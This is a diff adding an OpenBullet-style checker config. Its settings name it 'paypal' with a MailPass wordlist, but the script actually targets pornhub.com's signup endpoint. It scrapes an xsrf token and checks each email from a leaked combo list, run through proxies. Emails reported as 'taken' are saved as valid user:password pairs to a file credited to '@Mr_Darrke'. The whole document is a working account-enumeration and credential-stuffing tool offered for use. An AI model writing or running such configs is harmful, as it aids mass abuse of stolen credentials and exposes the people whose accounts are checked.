@@ -1,0 +1,102 @@
+[SETTINGS]
+{
+  "Name": "paypal",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-16T16:18:56.0234475+00:00",
+  "AdditionalInfo": "COMBO2021",
+  "Author": "COMBO2021",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "|COMBO2021|",
+      "VariableName": "",
+      "Id": 128410984
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#👑Get-Token REQUEST GET "https://www.pornhub.com/signup" 
+  
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+#👑Token PARSE "<SOURCE>" LR "id=\"xsrfToken\" value=\"" "\" />" -> VAR "Tok" 
+
+#👑Api REQUEST POST "https://www.pornhub.com/user/create_account_check?token=<Tok>" 
+  CONTENT "&check_what=email&email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.pornhub.com" 
+  HEADER "referer: https://www.pornhub.com/signup" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Microsoft Edge\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+#👑KeyCheck KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Email has been taken" 
+  KEYCHAIN Failure OR 
+    KEY "create_account_passed" 
+
+#👑Save UTILITY File "Pornhub-Reg-@Mr_Darrke.txt" AppendLines "<USER>:<PASS> | Author : @Mr_Darrke" 
+
+#👑Author FUNCTION Constant "COMBO2021" -> CAP "Author" 
+
